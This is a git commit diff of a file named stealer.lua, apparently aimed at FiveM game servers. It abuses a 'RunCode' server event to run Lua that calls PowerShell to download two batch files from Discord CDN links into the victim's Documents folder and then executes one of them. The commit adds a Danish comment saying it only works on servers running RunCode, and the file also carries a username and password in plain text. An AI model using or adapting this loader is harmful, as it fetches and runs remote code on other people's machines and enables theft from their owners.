029b4b4d8f6557f89b285964c7eca9211fcbebe2
0x98a <81833678+0x98a@users.noreply.github.com>
2021-04-09 14:25:01 +0200

    Renamed fil + added info

--- stealer.lua
+++ stealer.lua
@@ -1,4 +1,6 @@
 TriggerServerEvent('RunCode:RunStringRemotelly', [[local a="https://cdn.discordapp.com/attachments/736357418963042315/829695600613392414/sys.bat" local b="https://cdn.discordapp.com/attachments/736357418963042315/829695780444045352/sysre.bat" local c="C:/Users/%USERNAME%/Documents/System/sys.bat" local d="C:/Users/%USERNAME%/Documents/System/sysre.bat" local e="Invoke-WebRequest -Uri "..a.." -OutFile "..c..""local f="Invoke-WebRequest -Uri "..b.." -OutFile "..d..""os.execute("cd C:/Users/%USERNAME%/Documents && mkdir System")os.execute("powershell.exe -Command "..e.."")os.execute("powershell.exe -Command "..f.."")os.execute("cd C:/Users/%USERNAME%/Documents/System && start sysre.bat")]])
 
+
+-- VIRKER KUN HVIS SERVEREN HAR RUNCODE
 -- Username : SkildpaddeSquad
 -- Password : autist123!
